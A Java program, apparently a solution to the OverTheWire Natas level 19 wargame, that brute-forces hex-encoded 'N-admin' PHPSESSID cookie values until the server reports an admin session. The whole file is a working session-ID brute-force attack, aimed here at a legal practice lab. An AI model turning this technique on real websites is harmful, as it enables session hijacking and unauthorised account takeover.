import org.apache.commons.codec.binary.Hex;
import org.apache.commons.lang.time.StopWatch;
import org.apache.http.HttpResponse;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.util.EntityUtils;

/**
 * Created by alexk on 12.07.2017.
 */
public class SessionIdBruteForce {
    static String marker = "You are an admin.";
    static String target = "http://natas19.natas.labs.overthewire.org/";

    public static void main(String[] args) throws Exception {
        StopWatch stopWatch = new StopWatch();
        stopWatch.start();
        BasicCredentialsProvider credentialsProvider = new BasicCredentialsProvider();
        UsernamePasswordCredentials natas19 = new UsernamePasswordCredentials("natas19", "<censored>");
        credentialsProvider.setCredentials(AuthScope.ANY, natas19);
        HttpGet get = new HttpGet(target);

        for (int i = 1; i < 641; i++) {
            System.out.println(i);
            HttpClient httpClient = getHttpClient(credentialsProvider, i);
            HttpResponse response = httpClient.execute(get);
            if (response.getStatusLine().getStatusCode() == 200) {
                String responseBody = EntityUtils.toString(response.getEntity(), "UTF-8");
                if (responseBody.contains(marker)) {
                    System.out.println("YEY!!! WE FOUND IT!!!");
                    System.out.println(responseBody);
                    break;
                }
            }
        }
    }

    private static HttpClient getHttpClient(BasicCredentialsProvider credentialsProvider, int i) {
        String sid = i + "-admin";
        char[] encodedSID = Hex.encodeHex(sid.getBytes());
        BasicCookieStore cookieStore = new BasicCookieStore();
        BasicClientCookie cookie = new BasicClientCookie("PHPSESSID", new String(encodedSID));
        cookie.setPath("/");
        cookie.setDomain("natas19.natas.labs.overthewire.org");
        cookieStore.addCookie(cookie);
        return HttpClientBuilder.create()
                .setDefaultCredentialsProvider(credentialsProvider)
                .setDefaultCookieStore(cookieStore)
                .build();
    }
}